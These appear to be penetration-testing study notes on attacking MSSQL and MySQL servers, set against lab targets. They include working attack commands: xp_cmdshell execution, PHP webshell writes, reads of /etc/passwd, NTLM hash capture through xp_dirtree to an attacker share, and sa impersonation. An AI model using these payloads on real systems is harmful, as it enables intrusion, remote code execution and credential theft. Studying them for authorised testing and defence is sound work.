# Attacking SQL Database

systems that store data in tables (rows and columns) and use **SQL** to manage and query it.

Database servers are prime targets because they hold sensitive stuff like user credentials, personal info (PII), business data, and payment details. Plus, they’re often set up with high-privilege accounts. If we get in, we can use those privileges to move around the network (lateral movement) or gain more power (privilege escalation).

#### Enumeration:

* **MSSQL** uses TCP/1433 and UDP/1434 by default, or TCP/2433 if "hidden."
* **MySQL** uses TCP/3306.
*   We use **Nmap** to scan: **Output (example):**

    ```bash
    nmap -Pn -sV -sC -p1433 10.10.10.125
    ```

    * Port 1433 open.
    * Version: Microsoft SQL Server 2017.
    * Hostname: mssql-test.
    * Domain: HTB.LOCAL.

This gives us key info like version and hostname to spot misconfigs or vulnerabilities.

#### Authentication:

* **MSSQL** has two modes:
  1. **Windows Authentication**: Default, tied to Windows/AD accounts. No extra credentials if logged into Windows.
  2. **Mixed Mode**: Allows Windows or SQL Server-specific users/passwords.
* **MySQL**: Supports username/password and Windows auth (with a plugin).

Misconfigs can let us in without credentials. An old MySQL vuln (CVE-2012-2122) let you bypass auth by spamming a wrong password, exploiting timing differences.

#### Misconfigurations:

If auth is open (anonymous access) or a user has no password, we’re in.

#### Privileges:

With high privileges, we can:

* Read/edit database contents.
* Execute system commands.
* Read files.
* Steal hashes.
* Impersonate users.

#### Protocol Attacks:

#### Read/Change Data:

Once inside, we list databases, tables, and data. We pick tables with juicy info like passwords.

#### Connect:

* **MySQL**:

```bash
mysql -u julio -pPassword123 -h 10.129.20.13
```

*   **MSSQL** (Windows):

    ```bash
    sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!'
    ```
*   From Linux:

    ```bash
    sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
    ```

#### Execute Commands:

* **MSSQL**: Use **`xp_cmdshell`**:

Enable it if off:

````
```bash
xp_cmdshell 'whoami'
GO
```

```bash
EXECUTE sp_configure 'xp_cmdshell', 1
GO
RECONFIGURE
GO
```
````

* **MySQL**: No direct equivalent, but we can write executable files.

#### Write Files:

* **MySQL**:

Check secure\_file\_priv:

````
```bash
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

```bash
show variables like "secure_file_priv";
```
````

*   **MSSQL**:

    ```bash
    sp_configure 'Ole Automation Procedures', 1
    GO
    RECONFIGURE
    GO
    DECLARE @OLE INT
    EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
    EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\\inetpub\\wwwroot\\webshell.php', 8, 1
    EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
    GO
    ```

#### Read Files:

*   **MSSQL**:

    ```bash
    SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
    GO
    ```
*   **MySQL**:

    ```bash
    select LOAD_FILE("/etc/passwd");
    ```

#### Capture Hash:

*   **MSSQL**: Use \*\*`xp_dirtree**` with Responder:

    ```bash
    EXEC master..xp_dirtree '\\\\10.10.110.17\\share\\'
    GO
    ```

    ```bash
    sudo responder -I tun0
    ```

#### Impersonate Users:

*   **MSSQL**:

    ```bash
    EXECUTE AS LOGIN = 'sa'
    SELECT SYSTEM_USER
    GO
    ```

#### Talk to Other Databases:

*   **MSSQL**:

    ```bash
    SELECT srvname FROM sysservers
    GO
    EXECUTE('select @@servername') AT [10.0.0.12\\SQLEXPRESS]
    GO
    ```

This covers the basics of attacking SQL databases!
